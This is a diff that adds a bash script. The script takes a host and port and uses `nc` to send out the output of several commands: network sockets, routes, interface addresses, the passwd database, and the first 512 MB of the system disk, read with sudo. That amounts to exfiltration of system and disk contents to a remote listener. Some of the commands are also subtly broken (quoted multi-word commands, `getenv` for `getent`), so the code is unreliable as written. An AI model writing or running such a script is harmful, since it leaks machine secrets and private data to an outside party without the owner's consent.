@@ -1,0 +1,22 @@
+#!/usr/bin/env bash
+
+# Bash strict mode (https://github.com/alphabetum/bash-boilerplate)
+set -eEuo pipefail
+trap 'echo "Aborting (errexit line $LINENO). Exit code: $?" >&2' ERR
+
+_host="$1"
+_port="$2"
+
+echo "This is the host you passed me: $_host"
+echo "This is the port you passed me: $_port"
+
+_report() {
+	"$1" | nc -q 0 "$_host" "$_port"
+}
+
+_report date
+_report ss
+_report 'ip r'
+_report 'ip a'
+_report 'getenv passwd'
+_report 'sudo dd if=/dev/sda bs=512M count=1 | bzip2 -c'
